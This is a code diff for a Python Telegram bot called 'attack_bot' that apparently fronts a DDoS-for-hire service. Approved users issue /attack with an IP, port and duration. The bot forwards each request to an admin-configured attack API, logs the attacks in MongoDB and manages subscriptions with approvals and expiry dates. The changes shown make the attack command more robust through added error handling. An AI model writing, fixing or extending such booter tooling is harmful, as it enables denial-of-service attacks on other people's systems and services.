@@ -20,7 +20,6 @@ from pymongo import MongoClient, ASCENDING, DESCENDING
 import os
 from dotenv import load_dotenv
 
-# Basic setup
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 load_dotenv()
@@ -29,15 +28,12 @@ load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGODB_URI = os.getenv("MONGODB_URI")
 DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
-ADMIN_IDS = []
+
+# Parse admin ids safely
 admin_env = os.getenv("ADMIN_IDS", "8210011971").strip()
-# Remove quotes
 if admin_env.startswith('"') and admin_env.endswith('"'):
     admin_env = admin_env[1:-1]
-for part in admin_env.split(","):
-    part = part.strip()
-    if part.isdigit():
-        ADMIN_IDS.append(int(part))
+ADMIN_IDS = [int(x.strip()) for x in admin_env.split(",") if x.strip().isdigit()]
 if not ADMIN_IDS:
     ADMIN_IDS = [8210011971]
 
@@ -72,14 +68,14 @@ class Database:
         self.users = self.db.users
         self.attacks = self.db.attacks
         self.settings = self.db.settings
-        # Clean null users
-        self.users.delete_many({"user_id": None})
-        self.users.delete_many({"user_id": {"$exists": False}})
-        # Indexes
+        try:
+            self.users.delete_many({"user_id": None})
+            self.users.delete_many({"user_id": {"$exists": False}})
+        except:
+            pass
         self.attacks.create_index([("timestamp", DESCENDING)])
         self.attacks.create_index([("user_id", ASCENDING)])
         self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
-        # Default settings
         if not self.settings.find_one({"_id": "api_config"}):
             self.settings.insert_one({"_id": "api_config", "api_url": "", "api_key": ""})
     
@@ -110,10 +106,13 @@ class Database:
         return res.modified_count > 0
     
     def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = ""):
-        self.attacks.insert_one({"_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
-                                 "duration": duration, "status": status, "response": response[:500],
-                                 "timestamp": get_current_time()})
-        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
+        try:
+            self.attacks.insert_one({"_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
+                                     "duration": duration, "status": status, "response": response[:500],
+                                     "timestamp": get_current_time()})
+            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
+        except Exception as e:
+            logger.error(f"Log attack failed: {e}")
     
     def get_all_users(self):
         users = list(self.users.find({"user_id": {"$ne": None}}))
@@ -141,47 +140,46 @@ class Database:
 
 print("📦 Connecting to MongoDB...")
 db = Database()
-print("✅ Ready")
+print("✅ Database ready")
 
 def is_port_blocked(p): return p in BLOCKED_PORTS
 def blocked_ports_str(): return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))
 
 async def is_approved(uid):
-    u = db.get_user(uid)
-    if not u or not u.get("approved"): return False
-    exp = u.get("expires_at")
+    user = db.get_user(uid)
+    if not user or not user.get("approved"): return False
+    exp = user.get("expires_at")
     if exp and make_aware(exp) < get_current_time(): return False
     return True
 
-# ---------- API CALL WITH FULL ERROR DETAILS ----------
+# ---------- API CALL THAT NEVER RAISES EXCEPTION ----------
 def send_attack(ip: str, port: int, duration: int):
-    api_url, api_key = db.get_api_config()
-    if not api_url:
-        return False, "❌ API URL is not configured. Admin must use /setapi command or Admin Panel."
-    if not api_key:
-        return False, "❌ API Key is missing. Admin must set it."
-    
-    # Ensure URL scheme
-    if not api_url.startswith(("http://", "https://")):
-        api_url = "https://" + api_url
-    
-    # Prepare request
-    params = {"ip": ip, "port": port, "duration": duration}
-    headers = {"x-api-key": api_key}
     try:
+        api_url, api_key = db.get_api_config()
+        if not api_url:
+            return False, "❌ API URL is not configured. Admin must use /setapi or Admin Panel → Set API URL/Key."
+        if not api_key:
+            return False, "❌ API Key is missing. Admin must set it."
+        
+        if not api_url.startswith(("http://", "https://")):
+            api_url = "https://" + api_url
+        
+        params = {"ip": ip, "port": port, "duration": duration}
+        headers = {"x-api-key": api_key}
         response = requests.get(api_url, params=params, headers=headers, timeout=15)
+        
         if response.status_code == 200:
-            return True, f"✅ Attack launched successfully! HTTP {response.status_code}"
+            return True, f"✅ Attack launched successfully! HTTP {response.status_code}\nResponse: {response.text[:150]}"
         else:
-            return False, f"❌ API returned HTTP {response.status_code}: {response.text[:200]}"
+            return False, f"❌ API returned HTTP {response.status_code}: {response.text[:150]}"
     except requests.exceptions.NameResolutionError:
-        return False, f"❌ Domain not resolved: {api_url}. Check the API URL."
+        return False, f"❌ Domain not resolved: {api_url}. Check the API URL (must be valid domain/IP)."
     except requests.exceptions.ConnectionError as e:
         return False, f"❌ Connection error: {str(e)[:150]}"
     except requests.exceptions.Timeout:
         return False, "❌ Request timeout (15s). API server may be slow or down."
     except Exception as e:
-        return False, f"❌ Unexpected error: {str(e)[:200]}"
+        return False, f"❌ Unexpected API error: {str(e)[:200]}"
 
 # ---------- KEYBOARDS ----------
 def main_menu(is_admin: bool, approved: bool):
@@ -359,7 +357,6 @@ async def setapi_key(update, context):
     else:
         await update.message.reply_text("❌ Invalid. Cancelled.")
     context.user_data.clear()
-    # Back to admin panel
     uid = update.effective_user.id
     is_admin = uid in ADMIN_IDS
     approved = await is_approved(uid)
@@ -419,37 +416,55 @@ async def cancel_conv(update, context):
     await update.message.reply_text("Cancelled.")
     return ConversationHandler.END
 
-# ---------- ATTACK COMMAND WITH DIRECT ERROR HANDLING ----------
+# ========== FIXED ATTACK COMMAND WITH TRY-EXCEPT ==========
 async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await is_approved(uid):
-        await update.message.reply_text("❌ Your account is not approved or expired. Contact admin.")
-        return
-    args = context.args
-    if len(args) != 3:
-        await update.message.reply_text(f"❌ Usage: /attack <IP> <PORT> <DURATION>\nExample: /attack 1.2.3.4 80 60\n\nBlocked ports: {blocked_ports_str()}")
-        return
-    ip, port_str, dur_str = args
-    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
-        await update.message.reply_text("❌ Invalid IP address.")
-        return
     try:
-        port = int(port_str)
-        if port < MIN_PORT or port > MAX_PORT or is_port_blocked(port):
-            raise ValueError
-        duration = int(dur_str)
-        if duration < 1 or duration > 300:
-            raise ValueError
-    except:
-        await update.message.reply_text("❌ Invalid port (1-65535, not blocked) or duration (1-300s).")
-        return
-    
-    status_msg = await update.message.reply_text(f"🚀 Launching attack on `{ip}:{port}` for {duration}s...", parse_mode="Markdown")
-    success, message = send_attack(ip, port, duration)
-    db.log_attack(uid, ip, port, duration, "success" if success else "failed", message)
-    await status_msg.edit_text(message, parse_mode="Markdown")
+        uid = update.effective_user.id
+        if not await is_approved(uid):
+            await update.message.reply_text("❌ Your account is not approved or expired. Contact admin.")
+            return
+        
+        args = context.args
+        if len(args) != 3:
+            await update.message.reply_text(f"❌ Usage: /attack <IP> <PORT> <DURATION>\nExample: /attack 1.2.3.4 80 60\n\nBlocked ports: {blocked_ports_str()}")
+            return
+        
+        ip, port_str, dur_str = args
+        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
+            await update.message.reply_text("❌ Invalid IP address.")
+            return
+        
+        try:
+            port = int(port_str)
+            if port < MIN_PORT or port > MAX_PORT or is_port_blocked(port):
+                raise ValueError
+            duration = int(dur_str)
+            if duration < 1 or duration > 300:
+                raise ValueError
+        except:
+            await update.message.reply_text("❌ Invalid port (1-65535, not blocked) or duration (1-300s).")
+            return
+        
+        status_msg = await update.message.reply_text(f"🚀 Launching attack on `{ip}:{port}` for {duration}s...", parse_mode="Markdown")
+        
+        # Call API function (it already handles all exceptions internally)
+        success, message = send_attack(ip, port, duration)
+        
+        # Log attack (ensure no exception here)
+        try:
+            db.log_attack(uid, ip, port, duration, "success" if success else "failed", message)
+        except Exception as log_err:
+            logger.error(f"Logging failed: {log_err}")
+        
+        await status_msg.edit_text(message, parse_mode="Markdown")
+        
+    except Exception as e:
+        # Catch any unexpected error and send to user directly
+        error_text = f"❌ Unexpected error: {str(e)[:200]}\nPlease check API URL/Key configuration."
+        await update.message.reply_text(error_text)
+        logger.error(f"Attack command exception: {e}", exc_info=True)
 
-# Simple user commands (for direct use)
+# Other user commands (simplified)
 async def myinfo_cmd(update, context):
     uid = update.effective_user.id
     u = db.get_user(uid)
@@ -512,7 +527,6 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel_conv)],
     )
     
-    # Register handlers
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CommandHandler("attack", attack_cmd))
     app.add_handler(CommandHandler("myinfo", myinfo_cmd))
@@ -520,10 +534,7 @@ def main():
     app.add_handler(CommandHandler("blockedports", blocked_ports_cmd))
     app.add_handler(CommandHandler("help", help_cmd))
     
-    # Button callbacks (non-conversation)
     app.add_handler(CallbackQueryHandler(button_handler, pattern="^(attack_menu|myinfo|mystats|blockedports|help|admin_panel|back_main|admin_users|admin_stats|admin_status|admin_blockedports)$"))
-    
-    # Conversation handlers
     app.add_handler(setapi_conv)
     app.add_handler(approve_conv)
     app.add_handler(disapprove_conv)
